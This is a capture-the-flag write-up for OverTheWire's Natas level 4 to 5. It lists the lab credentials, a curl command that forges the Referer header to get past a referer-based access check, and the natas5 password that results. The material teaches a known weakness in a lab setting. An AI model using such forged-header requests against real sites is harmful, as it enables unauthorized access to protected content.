# Natas Level 04 to 05

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 4 -> 5 |
| Status | Complete |

## Objective

Bypass a referer-based access check.

## Given Access

User: `natas4`

Password:

```text
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Method

The application trusts the `Referer` header. Set it to the expected Natas URL.

## Commands

```bash
curl -s -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
  -e http://natas5.natas.labs.overthewire.org/ \
  http://natas4.natas.labs.overthewire.org/
```

## Result

Password for `natas5`:

```text
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

## Lesson

Client-controlled headers are not authorization. They can be forged by the requester.

## References

- https://overthewire.org/wargames/natas/
